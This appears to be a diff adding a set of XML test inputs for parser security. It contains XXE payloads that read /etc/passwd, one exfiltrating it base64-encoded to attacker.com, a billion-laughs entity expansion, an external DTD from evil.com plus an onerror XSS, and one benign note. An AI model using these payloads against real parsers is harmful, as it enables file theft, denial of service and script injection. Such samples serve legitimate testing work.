@@ -1,0 +1,66 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
+  <!ATTLIST root id ID #REQUIRED>
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root id="test1">&xxe;</root>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+  %exfiltrate;
+]>
+<data>content</data>
+```
+
+```xml
+<!DOCTYPE foo [
+  <!ELEMENT foo (bar*)>
+  <!ELEMENT bar (#PCDATA)>
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<foo>
+  <bar>&lol4;</bar>
+</foo>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE html [
+  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
+  %dtd;
+]>
+<html>
+  <head><title>Test</title></head>
+  <body>
+    <img src="x" onerror="alert('xss')"/>
+  </body>
+</html>
+```
+
+```xml
+<!DOCTYPE note [
+  <!ELEMENT note (to,from,heading,body)>
+  <!ELEMENT to (#PCDATA)>
+  <!ELEMENT from (#PCDATA)>
+  <!ELEMENT heading (#PCDATA)>
+  <!ELEMENT body (#PCDATA)>
+  <!NOTATION jpeg SYSTEM "image/jpeg">
+  <!ENTITY warning SYSTEM "warning.txt" NDATA jpeg>
+]>
+<note>
+  <to>John</to>
+  <from>Jane</from>
+  <heading>Reminder</heading>
+  <body>Don't forget the meeting!</body>
+</note>
+```
